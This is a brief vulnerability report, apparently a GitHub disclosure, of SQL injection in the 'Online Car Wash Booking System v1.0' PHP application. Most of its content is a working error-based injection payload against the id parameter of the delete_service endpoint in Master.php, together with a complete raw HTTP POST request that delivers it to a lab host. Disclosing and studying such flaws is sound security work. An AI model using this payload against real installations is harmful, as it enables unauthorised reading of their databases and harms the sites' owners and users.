# Online Car Wash Booking System v1.0 by oretnom23 has SQL injection

vendors: https://www.sourcecodester.com/php/15274/online-car-wash-booking-system-phpoop-free-source-code.html

Vulnerability File: /ocwbs/classes/Master.php?f=delete_service

Vulnerability location: /ocwbs/classes/Master.php?f=delete_service, id

[+] Payload: id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+  // Leak place ---> id


```sql
POST /ocwbs/classes/Master.php?f=delete_service HTTP/1.1
Host: 192.168.1.19
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Referer: http://192.168.1.19/ocwbs/admin/?page=services
Content-Length: 65
Cookie: PHPSESSID=qr1o26kvu55cqqitadqht6jna5
Connection: close

id=2' and updatexml(1,concat(0x7e,(select database()),0x7e),0)--+
```

![image](https://user-images.githubusercontent.com/54017627/169301071-2e9d3cb6-4c0b-4883-9163-ef06ba5cb154.png)
